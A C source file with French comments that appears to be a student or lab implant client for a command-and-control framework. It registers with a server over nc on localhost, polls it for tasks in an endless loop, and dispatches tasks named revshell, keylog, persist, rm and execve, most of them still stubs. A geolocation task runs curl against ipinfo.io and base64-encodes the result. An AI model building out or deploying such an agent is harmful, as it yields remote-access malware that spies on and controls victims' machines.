#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include "base64.h"

char uid[64];
double sleep_time = 5;

void get_uid() {
    FILE *fp;
    char result[1024];
    
    fp = popen("echo 'DECLARE,client,linux,terminal' | nc 127.0.0.1 8080", "r");
    fgets(result, sizeof(result), fp);
    pclose(fp);
    
    // format attendu: "Ok, ad8895843b")
    strtok(result, ",");         // ignore le premier champ
    char *id = strtok(NULL, ",");
    strcpy(uid, id);
    
    printf("Mon UID: %s\n", uid);
}

void task_execve() {
    printf("Exécution de la tâche execve\n");
    return;
}

void task_sleep() {
    printf("Exécution de la tâche sleep\n");
    return;
}

int task_locate() {
    printf("Exécution de la tâche locate\n");
    
    char result[4096];
    memset(result, 0, sizeof(result));
    
    // Récupération des informations de géolocalisation via ipinfo.io
    FILE *fp = popen("curl -s ipinfo.io", "r");
    
    char buffer[1024];
    while (fgets(buffer, sizeof(buffer), fp) != NULL) {
        strcat(result, buffer);
    }
    pclose(fp);
    
    // encoding in base64
    char *encoded_result = encode(result);
    
    printf("Informations de géolocalisation (base64): %s\n", encoded_result);
    free(encoded_result);
    
    return 0;
}

void task_revshell() {
    printf("Exécution de la tâche revshell\n");
    return;
}

void task_keylog() {
    printf("Exécution de la tâche keylog\n");
    return;
}

void task_persist() {
    printf("Exécution de la tâche persist\n");
    return;
}

void task_cat() {
    printf("Exécution de la tâche cat\n");
    return;
}

void task_mv() {
    printf("Exécution de la tâche mv\n");
    return;
}

void task_rm() {
    printf("Exécution de la tâche rm\n");
    return;
}

void task_ps() {
    printf("Exécution de la tâche ps\n");
    return;
}

void task_netstat() {
    printf("Exécution de la tâche netstat\n");
    return;
}

void execute_server_command(const char *command, char *result, size_t result_size) {
    FILE *fp = popen(command, "r");
    if (fp == NULL) {
        perror("Erreur lors de l'exécution de la commande");
        result[0] = '\0';
        return;
    }
    if (fgets(result, result_size, fp) == NULL) {
        perror("Erreur lors de la lecture de la réponse");
        result[0] = '\0';
    }
    pclose(fp);
}

void check_commands() {
    char cmd[256];
    char result[1024];
    
    sprintf(cmd, "echo 'FETCH,%s' | nc 127.0.0.1 8080", uid);
    execute_server_command(cmd, result, sizeof(result));
    
    printf("Réponse serveur: %s\n", result);
    
    // Vérification si le serveur renvoie une erreur
    if (strncmp(result, "ERROR", 5) == 0) {
        printf("Erreur reçue du serveur : %s\n", result);
        return;
    }
    
    // format attendu : "type,id_task,command,argument")
    char *type = strtok(result, ",");
    
    if (type != NULL) {
        if (strcmp(type, "EXECVE") == 0) {
            task_execve();
        } else if (strcmp(type, "SLEEP") == 0) {
            task_sleep();
        } else if (strcmp(type, "LOCATE") == 0) {
            task_locate();
        } else if (strcmp(type, "REVSHELL") == 0) {
            task_revshell();
        } else if (strcmp(type, "KEYLOG") == 0) {
            task_keylog();
        } else if (strcmp(type, "PERSIST") == 0) {
            task_persist();
        } else if (strcmp(type, "CAT") == 0) {
            task_cat();
        } else if (strcmp(type, "MV") == 0) {
            task_mv();
        } else if (strcmp(type, "RM") == 0) {
            task_rm();
        } else if (strcmp(type, "PS") == 0) {
            task_ps();
        } else if (strcmp(type, "NETSTAT") == 0) {
            task_netstat();
        } else {
            printf("Type inconnu ou non pris en charge : %s\n", type);
        }
    } else {
        printf("Réponse mal formatée ou vide.\n");
    }
}

int main() {
    // Initialiser la table de décodage
    build_decoding_table();
    
    // step 1 : get uid
    get_uid();
    
    while (1) {
        // step 2 : check tasks
        printf("\nVérification des commandes...\n");
        check_commands();
        sleep(sleep_time);
    }
    
    // Nettoyer avant de quitter
    base64_cleanup();
    return 0;
}